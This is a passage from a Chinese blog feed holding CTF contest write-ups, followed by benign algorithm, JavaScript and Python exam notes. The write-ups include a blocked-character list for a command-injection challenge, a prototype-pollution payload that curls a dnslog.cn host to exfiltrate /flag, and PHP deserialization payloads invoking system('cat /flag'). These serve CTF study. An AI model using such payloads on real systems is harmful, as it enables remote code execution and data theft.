alt="image-20230428142525171"></p><p>n的值要求20以内？但是跟n的值没啥关系</p><p><img src="/2023/04/28/writeup1/image-20230428142159616.png" alt="image-20230428142159616"></p><p>放进intruder模块进行一个爆破</p><p>就算我payload乱写</p><p><img src="/2023/04/28/writeup1/image-20230428142744778.png" alt="image-20230428142744778"></p><p><img src="/2023/04/28/writeup1/image-20230428142753653.png" alt="image-20230428142753653"></p><p>都可以拿到这个图片里的内容</p><p>然后将图片内容base64解码</p><p><img src="/2023/04/28/writeup1/image-20230428142824025.png" alt="image-20230428142824025"></p><p>末尾提示了一个<code>ffffpq.php</code></p><p>直接访问没有任何东西也没有提示</p><p>这时候想到之前的img参数，把<code>ffffpq.php</code>base64加密，赋值给img参数，让它读出来</p><p><img src="/2023/04/28/writeup1/image-20230428144015200.png" alt="image-20230428144015200"></p><p>解出来内容就是ffffpq.php的内容</p><p>成功get flag</p><p><img src="/2023/04/28/writeup1/image-20230428144117321.png" alt="image-20230428144117321"></p><p><img src="/2023/04/28/writeup1/image-20230428144135207.png" alt="image-20230428144135207"></p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>writeup</title>
    <link href="/2023/04/27/writeup/"/>
    <url>/2023/04/27/writeup/</url>
    
    <content type="html"><![CDATA[<h1 id="贵阳大数据及网络安全精英对抗赛第一天部分wp"><a href="#贵阳大数据及网络安全精英对抗赛第一天部分wp" class="headerlink" title="贵阳大数据及网络安全精英对抗赛第一天部分wp"></a>贵阳大数据及网络安全精英对抗赛第一天部分wp</h1><h2 id="PING吗！"><a href="#PING吗！" class="headerlink" title="PING吗！"></a>PING吗！</h2><p>拦截的符号:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">|;</span><br>$<br>;<br><span class="hljs-string">|</span><br>-<br>(<br>)<br>反引号<br><span class="hljs-string">||</span><br>&#125;<br>&#123;<br></code></pre></td></tr></table></figure><p>直接ls发现可以执行</p><p><img src="/2023/04/27/writeup/image-20230427103742262.png" alt="image-20230427103742262"></p><p>nl flag.php读内容</p><p><img src="/2023/04/27/writeup/image-20230427103758622.png" alt="image-20230427103758622"></p><p>get flag<img src="/2023/04/27/writeup/image-20230427103823566.png" alt="image-20230427103823566"></p><h2 id="小黑"><a href="#小黑" class="headerlink" title="小黑"></a>小黑</h2><p><img src="/2023/04/27/writeup/image-20230427140912555.png" alt="image-20230427140912555"></p><p><img src="/2023/04/27/writeup/image-20230427140922971.png" alt="image-20230427140922971"></p><p>flag{key&#x3D;FFD8FFE0}</p><h2 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h2><p>&#x2F;set?token&#x3D;<strong>proto</strong>&amp;key&#x3D;redis_set&amp;val&#x3D;curl http:&#x2F;&#x2F;<code>base64 /flag</code>.ll2858.dnslog.cn&#x2F;</p><p><img src="/2023/04/27/writeup/image-20230427164132868.png" alt="image-20230427164132868"></p><p>PUT &#x2F;bkup</p><p><img src="/2023/04/27/writeup/image-20230427164142644.png" alt="image-20230427164142644"></p><p><img src="/2023/04/27/writeup/image-20230427164837506.png" alt="image-20230427164837506"></p><p>base64解码</p><p>ZmxhZ3tLeVNjVXZLbkhXMnRSZ1lWbTU5V1N0ZDlKV2g5WHViOX0K</p><p>flag{KyScUvKnHW2tRgYVm59WStd9JWh9Xub9}</p><h2 id="time"><a href="#time" class="headerlink" title="time"></a>time</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">import</span> os<br><br><span class="hljs-attribute">flag</span> =<span class="hljs-meta"> []</span><br><span class="hljs-attribute">for</span> i in range(<span class="hljs-number">0</span>, <span class="hljs-number">37</span>):<br>    <span class="hljs-attribute">time</span> = int(os.path.getmtime(f<span class="hljs-string">&quot;./change&#123;i&#125;.txt&quot;</span>))<br>    <span class="hljs-attribute">flag</span>.append(chr(int(str((int(time * (<span class="hljs-number">10</span> ** <span class="hljs-number">9</span>) % (<span class="hljs-number">2</span> ** <span class="hljs-number">64</span> - <span class="hljs-number">1</span>) / (<span class="hljs-number">10</span> ** <span class="hljs-number">9</span>))))[-<span class="hljs-number">3</span>:])))<br><br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(flag))<br></code></pre></td></tr></table></figure><h2 id="wordexcelppt"><a href="#wordexcelppt" class="headerlink" title="wordexcelppt"></a>wordexcelppt</h2><p>把word改成zip后缀解压，发现error.xml内容是base64加密之后的图片，写出脚本解密并写入图片。</p><p>获得一个二维码，扫描拿到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./error.xml&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    image_base64 = base64.b64decode(f.read())<br><br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(image_base64))<br><span class="hljs-comment"># 解码图片</span><br>imgdata = image_base64<br><span class="hljs-comment">#将图片保存为文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;temp.jpg&quot;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(imgdata)<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/writeup/image-20230427124423532.png" alt="image-20230427124423532"></p><p>扫描获得flag</p><h2 id="线性代数"><a href="#线性代数" class="headerlink" title="线性代数"></a>线性代数</h2><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">from</span> sage.all import *<br><br><span class="hljs-keyword">global</span> p, alphabet<br>p = <span class="hljs-number">71</span><br>alphabet = <span class="hljs-string">&#x27;=0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ$!?_&#123;&#125;&lt;&gt;&#x27;</span><br><br>Gp = GF(p)<br><br>C = [<br>[<span class="hljs-meta">33 ,64 ,38 ,11 ,37 ,23 ,35 ,1 ,4 ,1 ,16</span>]<br>[<span class="hljs-meta">44 ,12 ,59 ,14 ,25 ,20 ,41 ,65 ,43 ,50 ,34</span>]<br>[<span class="hljs-meta">28 ,42 ,35 ,2 ,5 ,23 ,24 ,39 ,26 ,44 ,15</span>]<br>[<span class="hljs-meta">45 ,8 ,44 ,31 ,5 ,40 ,55 ,42 ,63 ,41 ,30</span>]<br>[<span class="hljs-meta">44 ,44 ,50 ,2 ,1 ,32 ,57 ,29 ,23 ,33 ,34</span>]<br>[<span class="hljs-meta">31 ,53 ,45 ,46 ,23 ,22 ,56 ,25 ,19 ,22 ,31</span>]<br>[<span class="hljs-meta">48 ,0 ,70 ,55 ,10 ,34 ,39 ,4 ,39 ,40 ,20</span>]<br>[<span class="hljs-meta">70 ,44 ,46 ,16 ,4 ,6 ,67 ,62 ,23 ,51 ,69</span>]<br>[<span class="hljs-meta">32 ,55 ,50 ,58 ,34 ,51 ,13 ,17 ,21 ,60 ,57</span>]<br>[<span class="hljs-meta">56 ,19 ,60 ,51 ,24 ,14 ,39 ,1 ,49 ,2 ,24</span>]<br>[<span class="hljs-meta">39 ,43 ,0 ,15 ,11 ,67 ,18 ,24 ,51 ,20 ,47</span>]<br>]<br>M1 = [<br>[<span class="hljs-meta">1 ,5 ,30 ,53 ,27 ,7 ,55 ,25 ,7 ,47 ,40</span>]<br>[<span class="hljs-meta">17 ,21 ,68 ,53 ,31 ,27 ,22 ,48 ,62 ,58 ,64</span>]<br>[<span class="hljs-meta">39 ,18 ,21 ,50 ,9 ,60 ,27 ,43 ,19 ,34 ,30</span>]<br>[<span class="hljs-meta">5 ,4 ,69 ,56 ,4 ,63 ,38 ,64 ,67 ,61 ,37</span>]<br>[<span class="hljs-meta">12 ,28 ,35 ,41 ,8 ,61 ,2 ,69 ,65 ,51 ,55</span>]<br>[<span class="hljs-meta">29 ,8 ,18 ,49 ,25 ,36 ,70 ,20 ,12 ,0 ,66</span>]<br>[<span class="hljs-meta">0 ,34 ,38 ,37 ,62 ,42 ,37 ,47 ,61 ,8 ,26</span>]<br>[<span class="hljs-meta">11 ,57 ,35 ,35 ,41 ,43 ,39 ,13 ,25 ,48 ,6</span>]<br>[<span class="hljs-meta">22 ,51 ,38 ,0 ,35 ,42 ,58 ,57 ,11 ,69 ,48</span>]<br>[<span class="hljs-meta">21 ,9 ,58 ,53 ,61 ,65 ,11 ,35 ,32 ,61 ,50</span>]<br>[<span class="hljs-meta">35 ,58 ,2 ,55 ,66 ,46 ,30 ,49 ,20 ,70 ,30</span>]<br>]<br>M2 = [<br>[<span class="hljs-meta">64 ,14 ,43 ,40 ,39 ,23 ,17 ,65 ,7 ,21 ,41</span>]<br>[<span class="hljs-meta">64 ,55 ,54 ,48 ,50 ,59 ,65 ,16 ,16 ,56 ,52</span>]<br>[<span class="hljs-meta">51 ,67 ,54 ,28 ,56 ,24 ,69 ,37 ,65 ,57 ,28</span>]<br>[<span class="hljs-meta">26 ,33 ,23 ,33 ,20 ,5 ,36 ,2 ,12 ,37 ,69</span>]<br>[<span class="hljs-meta">10 ,15 ,64 ,57 ,6 ,34 ,27 ,19 ,45 ,33 ,64</span>]<br>[<span class="hljs-meta">60 ,10 ,52 ,48 ,33 ,0 ,38 ,57 ,66 ,16 ,48</span>]<br>[<span class="hljs-meta">60 ,67 ,49 ,26 ,10 ,15 ,60 ,2 ,15 ,11 ,47</span>]<br>[<span class="hljs-meta">69 ,12 ,67 ,16 ,39 ,33 ,18 ,25 ,42 ,23 ,8</span>]<br>[<span class="hljs-meta">69 ,4 ,30 ,5 ,68 ,13 ,38 ,57 ,6 ,43 ,24</span>]<br>[<span class="hljs-meta">56 ,62 ,60 ,4 ,64 ,50 ,49 ,35 ,19 ,18 ,13</span>]<br>[<span class="hljs-meta">24 ,56 ,46 ,58 ,27 ,64 ,51 ,62 ,34 ,48 ,51</span>]<br>]<br>M3 = [<br>    [<span class="hljs-meta">61 ,26 ,61 ,24 ,15 ,46 ,34 ,57 ,8 ,68 ,41</span>]<br>[<span class="hljs-meta">54 ,41 ,24 ,58 ,29 ,18 ,3 ,50 ,61 ,52 ,64</span>]<br>[<span class="hljs-meta">62 ,24 ,20 ,39 ,6 ,24 ,64 ,13 ,1 ,23 ,13</span>]<br>[<span class="hljs-meta">10 ,66 ,33 ,39 ,14 ,46 ,2 ,52 ,31 ,36 ,39</span>]<br>[<span class="hljs-meta">66 ,63 ,49 ,45 ,0 ,40 ,29 ,55 ,22 ,43 ,43</span>]<br>[<span class="hljs-meta">22 ,70 ,20 ,66 ,30 ,44 ,4 ,43 ,43 ,2 ,2</span>]<br>[<span class="hljs-meta">34 ,29 ,16 ,21 ,43 ,17 ,21 ,1 ,21 ,41 ,45</span>]<br>[<span class="hljs-meta">15 ,4 ,4 ,57 ,63 ,58 ,52 ,62 ,21 ,18 ,36</span>]<br>[<span class="hljs-meta">23 ,54 ,68 ,1 ,48 ,49 ,59 ,9 ,12 ,48 ,42</span>]<br>[<span class="hljs-meta">21 ,29 ,35 ,3 ,57 ,25 ,20 ,45 ,65 ,38 ,66</span>]<br>[<span class="hljs-meta">49 ,17 ,40 ,62 ,20 ,0 ,48 ,35 ,38 ,45 ,68</span>]<br>      ]<br><br>C = Matrix(Gp, C)<br>M1 = Matrix(Gp, M1)<br>M2 = Matrix(Gp, M2)<br>M3 = Matrix(Gp, M3)<br><br>U = M2 * M1**(<span class="hljs-number">-1</span>)<br><br>S2 = U**(<span class="hljs-number">-1</span>) * M2 * U<br><br>R1 = S2**<span class="hljs-number">4</span> * M3**(<span class="hljs-number">-1</span>)<br><br>A = U**(<span class="hljs-number">-1</span>) * C - <span class="hljs-function">R1</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-params">A</span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function"></span><br><span class="hljs-function">def <span class="hljs-title">unprepare</span>(<span class="hljs-params">A</span>):</span><br><span class="hljs-function">    msg</span> = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-function"><span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-title">range</span>(<span class="hljs-params"><span class="hljs-number">24</span></span>):</span><br><span class="hljs-function">        i, j</span> = <span class="hljs-number">5</span>*k <span class="hljs-comment">// 11, 5*k % 11</span><br>        msg += alphabet[<span class="hljs-built_in">int</span>(A[i, j])]<br>    <span class="hljs-keyword">return</span> <span class="hljs-function">msg</span><br><span class="hljs-function"></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-params">unprepare(A</span>))</span><br></code></pre></td></tr></table></figure><h2 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h2><p>O:2:”TT”:2:{s:3:”key”;s:4:”test”;s:1:”c”;O:2:”JJ”:1:{s:3:”obj”;s:6:”assert”;}}’</p><p>这个payload会将序列化的对象转换为TT和JJ两个类的实例，其中JJ类的$obj属性设置为assert函数，从而达到任意代码执行的目的。</p><p>针对第二个漏洞，攻击者可以构造如下payload：</p><p>O:2:”TT”:2:{s:3:”key”;s:4:”test”;s:1:”c”;O:2:”JJ”:1:{s:3:”obj”;s:4:”evil”;}}’</p><p>这个payload会将序列化的对象转换为TT和JJ两个类的实例，其中JJ类的$obj属性设置为evil方法，攻击者可以在参数中传入任意代码。</p><p>针对第三个漏洞，攻击者可以构造如下payload：</p><p>O:2:”TT”:2:{s:3:”key”;s:4:”test”;s:1:”c”;O:2:”MM”:2:{s:4:”name”;s:7:”system”;s:1:”c”;s:6:”whoami”;}}’</p><p>这个payload会将序列化的对象转换为TT和MM两个类的实例，其中MM类的$name属性设置为assert函数，$c属性设置为system命令，攻击者可以执行任意系统命令。</p><p>最终payload:</p><p>O:2:”TT”:2:{s:3:”key”;O:2:”JJ”:1:{s:3:”obj”;O:2:”MM”:2:{s:4:”name”;s:6:”system”;s:1:”c”;s:9:”cat &#x2F;flag”;}}s:1:111;N;}</p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>蓝桥刷题记录</title>
    <link href="/2023/03/31/%E8%93%9D%E6%A1%A5%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <url>/2023/03/31/%E8%93%9D%E6%A1%A5%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<p><strong>为了督促自己多刷题</strong></p><h1 id="3-31"><a href="#3-31" class="headerlink" title="3-31"></a>3-31</h1><p>题目:</p><p><img src="/2023/03/31/%E8%93%9D%E6%A1%A5%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230331214903142.png" alt="image-20230331214903142"></p><p>代码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> datetime <span class="hljs-keyword">as</span> dt<br>a = dt.date(<span class="hljs-number">1900</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">n</span>):<br>    <span class="hljs-keyword">if</span> n %<span class="hljs-number">2012</span>==<span class="hljs-number">0</span>  <span class="hljs-keyword">and</span> n %<span class="hljs-number">3</span>==<span class="hljs-number">0</span> <span class="hljs-keyword">and</span> n %<span class="hljs-number">12</span>==<span class="hljs-number">0</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">str</span>(n)[<span class="hljs-number">4</span>:<span class="hljs-number">6</span>]==<span class="hljs-string">&#x27;06&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>x=<span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    b = a + dt.timedelta(days=x)<br>    n = <span class="hljs-built_in">int</span>(<span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">str</span>(b).split(<span class="hljs-string">&#x27;-&#x27;</span>)))<br>    <span class="hljs-keyword">if</span> check(n):<br>        <span class="hljs-built_in">print</span>(n)<br>        <span class="hljs-keyword">break</span><br>    x+=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>日期相关的问题一般用date库最方便，不用的话你还得判断月份对不对，日期对不对，这个月有三十天还是三十一天，这年的二月有多少天，直接用date库往上加日期，什么都不用考虑</p><p>题目：</p><p><img src="/2023/03/31/%E8%93%9D%E6%A1%A5%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230331215811169.png" alt="image-20230331215811169"></p><p>代码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">n = <span class="hljs-number">4</span><br>heng = <span class="hljs-number">19</span><br>shu = <span class="hljs-number">21</span>*<span class="hljs-number">20</span><br><span class="hljs-built_in">print</span>(n+heng+shu)<br><span class="hljs-comment">#填空题没啥好说的，直接口算</span><br></code></pre></td></tr></table></figure><p>题目：</p><p><img src="/2023/03/31/%E8%93%9D%E6%A1%A5%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230331232105291.png" alt="image-20230331232105291"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">gcd</span>(<span class="hljs-params">a, b</span>):<br>    r = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> (r != <span class="hljs-number">0</span>):<br>        r = a % b<br>        a = b<br>        b = r<br>    <span class="hljs-keyword">return</span> a<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gbs</span>(<span class="hljs-params">a,b</span>):<br>    <span class="hljs-keyword">return</span> a * b // gcd(a,b)<br><br>lst = [<span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>)]*(<span class="hljs-number">2021</span>+<span class="hljs-number">1</span>)<br>lst[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2022</span>):<br>  <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i + <span class="hljs-number">1</span>, i + <span class="hljs-number">22</span>):<br>    <span class="hljs-keyword">if</span> j &gt; <span class="hljs-number">2021</span>:<br>      <span class="hljs-keyword">break</span><br>    lst[j] = <span class="hljs-built_in">min</span>(lst[j], lst[i] + gbs(i, j))<br><span class="hljs-built_in">print</span>(lst[<span class="hljs-number">2021</span>])<br><br></code></pre></td></tr></table></figure><p>最短路径算法，</p>]]></content>
    
    
    
    <tags>
      
      <tag>note</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>jsnote</title>
    <link href="/2023/03/27/jsnote/"/>
    <url>/2023/03/27/jsnote/</url>
    
    <content type="html"><![CDATA[<h1 id="DAY1"><a href="#DAY1" class="headerlink" title="# DAY1"></a># DAY1</h1><p>通过id操作html元素</p><p><code>document.getElementById()</code></p><p>操作元素属性</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js">.<span class="hljs-property">innerHTML</span><br>.<span class="hljs-property">src</span><br>.<span class="hljs-property">style</span><br></code></pre></td></tr></table></figure><h1 id><a href="#" class="headerlink" title></a></h1><p>javascript显示</p><ul><li><code>window.alert()</code>弹窗</li><li><code>document.write()</code>写入html输出</li><li><code>innerHTML</code>写入HTML元素</li><li><code>console.log</code>控制台日志</li></ul><p><code>document.write()</code>方法仅用于测试,<code>document.write()</code>会删除已有html</p><h1 id="-1"><a href="#-1" class="headerlink" title></a></h1><p><strong>JavaScript 对大小写敏感！！</strong></p>]]></content>
    
    
    
    <tags>
      
      <tag>note</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python2级速通</title>
    <link href="/2023/03/25/python%E4%BA%8C%E7%BA%A7%E9%80%9F%E9%80%9A/"/>
    <url>/2023/03/25/python%E4%BA%8C%E7%BA%A7%E9%80%9F%E9%80%9A/</url>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>​本篇笔记是在笔者刷python二级题目的时候，一边刷题一边总结的随笔，希望可以位后续的要备考的同学提供一点微薄的帮助。</p><p>​因为是随手记的，格式和顺序可能会不太完美。</p><h1 id="选择题"><a href="#选择题" class="headerlink" title="选择题"></a>选择题</h1><p>主要包括以下内容：</p><ul><li>数据结构与算法</li><li>python基础</li><li>软件测试相关</li><li>数据库设计基础</li><li>软件工程基础</li></ul><p>分值分布：</p><ul><li>算法，软件工程，软件测试，数据库设计（15左右）</li></ul><p>这部分内容，没有学过相关专业的同学死记硬背即可，不用花太多时间在上面，刷题的时候错题标记一下然后再刷一遍错题即可。</p><ul><li>python基础（15左右）</li></ul><p>包括的知识点有，数据类型特点，函数的特点和使用，和对运行流程结果的判断，这部分内容就不要死记硬背了，这部分内容要结合做操作题的经验，理解性记忆。</p><p>在做判断运行流程结果的题目时，注意以下几点:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">1.</span><span class="hljs-built_in">input</span>()函数返回的是字符串，他在对返回的数据处理时有没有进行转换。<br><span class="hljs-number">2.</span>考察输出结果时，一定要看清楚输出的是什么，如果<span class="hljs-built_in">print</span>()里面是个函数，就注意看函数有没有返回值,返回值是什么数据类型。<br><span class="hljs-number">3.</span>注意代码缩进层次结构，哪些代码会被运行，哪些不会，要捋清楚，他经常会写一些不会被运行的部分来迷惑你。<br></code></pre></td></tr></table></figure><p>其他的内容，像什么做什么需要哪个函数，在什么什么情况该用哪个语句，这些题目不需要花时间去刷，你在刷后面操作题的时候这些内容都已经理解记忆在脑子里了。</p><ul><li>pyhon背景和生态（10左右）</li></ul><p>就是问哪些第三方库是干什么的，在哪个领域有哪些库支持</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">开发用户界面(GUI):pyGTK,pygobject，PyQt<br>数据分析:seabom,mayavi2,numpy,scipy,pandas,matplotlib<br>web开发:pyramid,flask,django<br>文本处理:pdfminer,openpyxl<br>游戏开发:pygame<br>图像处理:PIL,Arcade<br>机器学习:mxnet,Tensorflow,PyTorch,Scikit-learn<br>网络爬虫:scrapy,requests<br>用来安装第三方库的工具是pip，把py脚本打包成可执行文件的是pyinstaller<br></code></pre></td></tr></table></figure><p>其次就是python作为一个解释性语言的一些特点，和静态编译语言的一些区别对照之类的</p><p><strong>选择题一定要保证在25分以上</strong> ！！</p><h1 id="操作题"><a href="#操作题" class="headerlink" title="操作题"></a>操作题</h1><h2 id="三个模块："><a href="#三个模块：" class="headerlink" title="三个模块："></a>三个模块：</h2><ul><li>基础操作：主要考点，格式化输出，对结构控制语句的掌握</li><li>简单应用：turtle库，列表，字典的处理，排序,文件读取写入</li><li>综合应用：文件读取写入，内容遍历，排序。在简单应用基础上增加要求</li></ul><h2 id="格式化输出"><a href="#格式化输出" class="headerlink" title="格式化输出"></a>格式化输出</h2><ul><li><p>{:&lt;填充&gt;&lt;对齐&gt;&lt;宽度&gt;&lt;,(千分位分隔符)&gt;&lt;.精度&gt;&lt;类型&gt;}</p></li><li><p>&lt;左对齐   &gt;右对齐  ^居中对齐</p></li><li><p>.2f 两位小数</p></li><li><p>x 十六进制输出 b二进制 d十进制 o八进制</p></li></ul><p><img src="/2023/03/25/python%E4%BA%8C%E7%BA%A7%E9%80%9F%E9%80%9A/image-20230325134853630.png" alt="image-20230325134853630"></p><p><img src="/2023/03/25/python%E4%BA%8C%E7%BA%A7%E9%80%9F%E9%80%9A/image-20230325134937908.png" alt="image-20230325134937908"></p><p>false：</p><p><img src="/2023/03/25/python%E4%BA%8C%E7%BA%A7%E9%80%9F%E9%80%9A/image-20230325134942614.png" alt="image-20230325134942614"></p><p>true：(细节就是多了一个空格….挺无语的避免细节扣分)</p><p><img src="/2023/03/25/python%E4%BA%8C%E7%BA%A7%E9%80%9F%E9%80%9A/image-20230325134950746.png" alt="image-20230325134950746"></p><p>例题1：</p><p><img src="/2023/03/25/python%E4%BA%8C%E7%BA%A7%E9%80%9F%E9%80%9A/image-20230325135059119.png" alt="image-20230325135059119"></p><p><img src="/2023/03/25/python%E4%BA%8C%E7%BA%A7%E9%80%9F%E9%80%9A/image-20230325135103898.png" alt="image-20230325135103898"></p><ul><li><p>中文字符取值范围：’\ue400’ 到’\u9fff’</p></li><li><p>大写方法name.upper(),小写name.lower()</p></li></ul><p>例题2:</p><p><img src="/2023/03/25/python%E4%BA%8C%E7%BA%A7%E9%80%9F%E9%80%9A/image-20230325135110219.png" alt="image-20230325135110219"></p><p><img src="/2023/03/25/python%E4%BA%8C%E7%BA%A7%E9%80%9F%E9%80%9A/image-20230325135114557.png" alt="image-20230325135114557"></p><p>例题3:</p><p><img src="/2023/03/25/python%E4%BA%8C%E7%BA%A7%E9%80%9F%E9%80%9A/image-20230325135118525.png" alt="image-20230325135118525"></p><h2 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">list</span>.sort( key=<span class="hljs-literal">None</span>, reverse=<span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure><p><img 